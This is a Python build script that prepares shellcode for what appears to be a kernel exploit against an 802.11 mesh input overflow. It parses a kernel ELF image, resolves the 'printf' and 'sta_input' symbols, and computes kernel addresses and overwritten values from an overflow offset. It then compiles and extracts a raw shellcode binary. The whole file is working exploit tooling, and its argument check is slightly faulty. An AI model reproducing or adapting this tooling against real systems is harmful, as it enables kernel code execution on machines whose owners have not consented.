#!/usr/bin/env python3

from elftools.elf.elffile import ELFFile
import sys
import os
import x86

#
# See exploit.py for this constant.
#
MESH_OVERFLOW_LEN =  32
MESH_OVERFLOW_LEN += 2
MESH_OVERFLOW_LEN += 136

def ExecuteCmd(cmd):
	print("Executing: " + cmd)
	exitcode = os.system(cmd)
	if exitcode != 0:
		print("Failed")
		sys.exit(1)

if __name__ == '__main__':
	if len(sys.argv) < 1:
		print("usage: ./build.py $kernel")
		sys.exit(1)
	fname = sys.argv[1]

	elf = ELFFile(open(fname, 'rb'))

	symtab = elf.get_section_by_name('.symtab')
	if not symtab:
		print('No symbol table available!')
		sys.exit(1)

	# Resolve 'printf'.
	sym = symtab.get_symbol_by_name("printf")[0]
	if not sym:
		print("printf not found")
		sys.exit(1)
	printf_address = sym['st_value']

	# Resolve 'sta_input'.
	sym = symtab.get_symbol_by_name("sta_input")[0]
	if not sym:
		print("sta_input not found")
		sys.exit(1)
	file_offset = None
	for seg in elf.iter_segments():
		if seg.header['p_type'] != 'PT_LOAD':
			continue
		if sym['st_value'] >= seg['p_vaddr'] and sym['st_value'] < seg['p_vaddr'] + seg['p_filesz']:
			file_offset = sym['st_value'] - seg['p_vaddr'] + seg['p_offset']
			break
	if not file_offset:
		print('Error getting file offset from ELF data')
		sys.exit(1)

	elf.stream.seek(file_offset + MESH_OVERFLOW_LEN)

	data_address = (
		x86.KERN_L4_BASE +
		1 * x86.NBPD_L3 +
		1 * x86.NBPD_L2 +
		2 * x86.NBPD_L1 +
		(sym['st_value'] & 0xFFF) + MESH_OVERFLOW_LEN
	)

	data_value = int.from_bytes(elf.stream.read(8), "little")
	len_value = int.from_bytes(elf.stream.read(4), "little")

	print("'data' addr=" + hex(data_address) + " value=" + hex(data_value))
	print("'len' value=" + hex(len_value))
	print("'printf' addr=" + hex(printf_address))

	cmd = "cc -o shellcode shellcode.S -nostdlib"
	cmd += " -DPRINTF_ADDRESS=" + hex(printf_address)
	cmd += " -DDATA_ADDRESS=" + hex(data_address)
	cmd += " -DDATA_VALUE=" + hex(data_value)
	cmd += " -DLEN_VALUE=" + hex(len_value)
	ExecuteCmd(cmd)

	cmd = "objcopy -O binary -j .text shellcode shellcode.bin"
	ExecuteCmd(cmd)

	cmd = "rm shellcode"
	ExecuteCmd(cmd)

	print("Done")
